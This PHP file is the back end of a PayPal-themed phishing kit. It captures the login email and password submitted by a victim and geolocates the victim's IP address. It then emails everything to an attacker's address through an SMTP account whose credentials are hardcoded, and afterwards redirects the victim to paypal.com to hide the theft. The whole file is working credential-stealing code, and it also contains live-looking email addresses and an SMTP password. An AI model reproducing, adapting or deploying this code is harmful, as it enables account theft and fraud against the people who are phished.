<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';


// Edit only this please
// Badboy email address
$badboyMail = 'durallite@gmail.com';



//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

// get ip
$ip = $_SERVER['REMOTE_ADDR'];
$ip_info = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
// Information

$GoodBoyMail = $_POST['login_email'];
$GoodBoyPassword = $_POST['login_password'];
$GoodBoyDestination = $_POST['RedirectTo'];
$GoodBoyIp = $ip;
$GoodBoyCountry = $ip_info->geoplugin_countryName;
$GoodBoyCity = $ip_info->geoplugin_city;
$GoodBoyLat = $ip_info->geoplugin_latitude;
$GoodBoyLong = $ip_info->geoplugin_longitude;
$GoodBoyCurrency = $ip_info->geoplugin_currencyCode;
try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER; //Enable verbose debug output
    $mail->isSMTP(); //Send using SMTP
    $mail->Host = 'mail.topkonnect.net'; //Set the SMTP server to send through
    $mail->SMTPAuth = true; //Enable SMTP authentication
    $mail->Username = 'dev@topkonnect.net'; //SMTP username
    $mail->Password = 'EmzSbQ6F8CSKRRC'; //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; //Enable implicit TLS encryption
    $mail->Port = 465; //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('Badboy@badboy.com', 'BlackReport');
    $mail->addAddress($badboyMail, 'BlackReport'); //Add a recipient
    // $mail->addAddress('adurauiux@gmail.com'); //Name is optional
    // $mail->addReplyTo('dev@topkonnect.net', 'Information');
    // $mail->addCC('cc@example.com');
    $mail->addBCC('Badboy@mail.com');

    // //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true); //Set email format to HTML
    $mail->Subject = 'Password and mail for the account';
    $mail->Body = ' <div
    style="
      width: 50%;
      border: 1px solid gray;
      border-radius: 20px;
      padding: 20px;
      font-family: monospace;
    "
  >
    <h4>Log from ' . $GoodBoyDestination . '</h4>
    <p><strong>email :</strong> <span>' . $GoodBoyMail . '</span></p>
    <br />
    <p><strong>password :</strong> <span>' . $GoodBoyPassword . '</span></p>
    <br />
    <p><strong>Ip :</strong> <span>' . $GoodBoyIp . '</span></p>
    <br />
    <p><strong>country :</strong> <span>' . $GoodBoyCountry . '</span></p>
    <br />
    <p><strong>city :</strong> <span>' . $GoodBoyCity . '</span></p>
    <br />
    <p><strong>latitude :</strong> <span>' . $GoodBoyLat . '</span></p>
    <br />
    <p><strong>Longitude :</strong> <span>' . $GoodBoyLong . '</span></p>
    <br />
    <p><strong>The currency :</strong> <span>' . $GoodBoyCurrency . '</span></p>
    <br />
  </div>';
    $mail->AltBody = 'Log man';

    $mail->send();
    header("Location: https://paypal.com");
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    header("Location: https://paypal.com");

}
